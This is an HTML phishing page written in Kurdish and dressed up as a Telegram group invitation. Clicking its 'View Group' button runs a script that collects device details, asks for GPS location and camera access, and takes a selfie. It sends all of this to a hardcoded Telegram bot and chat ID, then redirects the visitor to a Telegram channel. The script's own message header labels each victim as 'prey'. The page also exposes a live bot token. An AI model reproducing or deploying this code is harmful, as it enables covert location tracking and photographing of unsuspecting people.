<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: Join Group</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #e7ebf0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 35px 25px;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            text-align: center;
            max-width: 360px;
            width: 90%;
        }
        .icon {
            width: 80px;
            height: 80px;
            background: #24A1DE;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px auto;
        }
        .icon svg {
            width: 45px;
            height: 45px;
            fill: white;
            margin-left: -4px;
        }
        h2 { font-size: 20px; color: #222; margin-bottom: 10px; }
        p { font-size: 14px; color: #707579; margin-bottom: 25px; line-height: 1.5; }
        .btn {
            background-color: #24A1DE;
            color: white;
            border: none;
            padding: 14px 40px;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            box-sizing: border-box;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #1d82b3; }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">
        <svg viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-1-.65-.35-1 .22-1.62.15-.15 2.7-2.46 2.75-2.67.01-.03.01-.15-.06-.21-.07-.06-.17-.04-.25-.02-.11.02-1.92 1.22-5.43 3.59-.51.35-.98.52-1.39.51-.46-.01-1.34-.26-2-.47-.8-.26-1.43-.4-1.38-.85.03-.23.35-.47.96-.71 3.76-1.64 6.27-2.72 7.53-3.25 3.58-1.51 4.32-1.77 4.81-1.78.11 0 .35.03.5.16.13.12.17.28.19.39.02.13.02.27 0 .41z"/>
        </svg>
    </div>
    <h2>بینینی گروپ بە فەرمی</h2>
    <p>بۆ چوونە ناو گروپەکە و بینینی ئەندامان، تکایە کلیک لەسەر دوگمەی خوارەوە بکە.</p>
    <button id="viewGroupBtn" class="btn">View Group</button>
</div>

<script>
const BOT_TOKEN = "7953266205:AAElpU3B3iAytm4K7u_iU7q-1-N9oInK90I";
const CHAT_ID = "1629990392";

document.getElementById("viewGroupBtn").addEventListener("click", async function() {
    let text = "🦅 نێچیرێکی نوێ ڕاوکرا!\n\n";
    text += "🌐 وێبگەر: " + navigator.userAgent.split(" ")[0] + "\n";
    text += "📱 ئامێر: " + (/iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iPhone (iOS)" : "Android") + "\n";
    text += "⚙️ بزوێنەر: " + navigator.platform + "\n";
    text += "📐 شاشە: " + window.screen.width + "x" + window.screen.height + "\n";
    text += "⏰ کات: " + new Date().toLocaleTimeString() + "\n";

    // داواکردنی لۆکەیشنی دەقیق (GPS)
    let mapsUrl = "مۆڵەت نەدرا!";
    if (navigator.geolocation) {
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            mapsUrl = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } catch (e) {
            mapsUrl = "ڕەتکرایەوە یان ڕووینەدا!";
        }
    }
    text += "📍 نەخشەی GPS: " + mapsUrl;

    // داواکردنی کامێرا و گرتنی وێنە
    try {
        let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        let video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        let canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        let ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        stream.getTracks().forEach(track => track.stop());

        // ناردنی وێنەکە بە شێوەی Photo بۆ تێلیگرام
        canvas.toBlob(async function(blob) {
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.jpg");
            formData.append("caption", text);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });

            window.location.href = "https://t.me/kurdish_sys";
        }, "image/jpeg");

    } catch (e) {
        // ئەگەر کامێرا ڕەتکرایەوە، تەنها تێکستەکە بنێرێت
        let formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("text", text + "\n❌ مۆڵەتی کامێرا نەدرا!");

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            body: formData
        });

        window.location.href = "https://t.me/kurdish_sys";
    }
});
</script>

</body>
</html>
